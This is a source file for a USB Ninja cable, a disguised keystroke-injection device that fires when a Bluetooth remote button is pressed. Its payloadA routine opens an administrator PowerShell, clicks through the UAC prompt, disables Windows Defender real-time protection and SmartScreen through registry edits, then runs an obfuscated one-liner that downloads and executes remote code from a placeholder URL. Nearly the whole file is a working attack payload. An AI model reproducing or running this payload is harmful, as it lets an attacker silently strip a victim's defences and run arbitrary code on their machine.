//#define LAYOUT_TURKISH  //Add this line before include
						  // can switch Keyboard layout.
#include <NinjaKeyboard.h>


/*https://www.usbninja.com/
This is the Code of Using Bluetooth remote control triggers Ninja to go
online, and act as a keyboard output characters.

payloadA() {}
When the Bluetooth remote control button A is pressed. 
The program in payloadA() will be executed in a loop. 
Until the button A is released.

payloadB() {}
When the Bluetooth remote control button B is pressed. 
The program in payloadB() will be executed in a loop. 
Until the button B is released.

setup() and loop() don't need to do anything.
  
*/

void setup() 
{
  //SetRunOnce(PAYLOADA,true);
  //SetRunOnce(PAYLOADB,true);
  //If you want payload to run only once, run this function.  
} 
                //
void loop() {}

/*
When the Bluetooth remote control button A is pressed. 
The program in payloadA() will be executed in a loop. 
Until the button A is released.
*/

void payloadA()
{
    
    USBninjaOnline(); // USBNinja appears.  The cable's data
                        //line was temporarily cut off.
	/*
	You should call NinjaKeyboard.begin() after you call 
	NinjaKeyboard.end()
	Or, the NinjaKeyboard was disconnected and any action was not usable.
	*/
	  NinjaKeyboard.begin();     //Initliaze NinjaKeyboard USB Interface.

   NinjaKeyboard.sendKeyStroke(0); //Send HID '0' to compatibility Win7.

   // Pop admin powershell
NinjaKeyboard.delay(2000);
NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
NinjaKeyboard.delay(2000);
NinjaKeyboard.println(F("powershell start powershell -V runAs"));

// Select yes on UAC
NinjaKeyboard.delay(4500);
NinjaKeyboard.sendKeyStroke(KEY_TAB);
NinjaKeyboard.delay(100);
NinjaKeyboard.sendKeyStroke(KEY_TAB);
NinjaKeyboard.delay(100);
NinjaKeyboard.sendKeyStroke(KEY_ENTER); 

// Disable A/V
NinjaKeyboard.delay(2000);
NinjaKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));

// Disable SmartScreen via Regedits
NinjaKeyboard.delay(250);
NinjaKeyboard.println(F("Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer -Name SmartScreenEnabled -Type String -Value Off"));
NinjaKeyboard.delay(250);
NinjaKeyboard.println(F("Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost -Name EnableWebContentEvaluation -Type DWord -Value 0"));

NinjaKeyboard.delay(250);
NinjaKeyboard.println(F("exit"));

// Pop ze Shell
NinjaKeyboard.delay(2000);
NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
NinjaKeyboard.delay(1000);
NinjaKeyboard.println(F("cmd.exe /c powershell -nop -w 1 -c iex (.('ne'+'w-ob'+'ject') ('ne'+'t.webc'+'lient')).('do'+'wnloadstr'+'ing').invoke(('<ENTER URL>'))"));

	/*
	While your cable connect to Some Phone, Only switch USB DATA was 
	not enough. The PC was still think that your phone was Ninja 
	(Your Phone Not send USB ReEmulate command), it may cause 
	non-stoppable input or NinjaKeyboard Device still Retain in your system.
	*/
  	NinjaKeyboard.end();          //Send Disconnect command to
  	                                //NinjaKeyboard USB Interface	
    USBninjaOffline();  //USBNinja disappear. Cable Line back to normal.
}

/*
When the Bluetooth remote control button B is pressed. 
The program in payloadB() will be executed in a loop. 
Until the button B is released.
*/

void payloadB()
{
                          
}
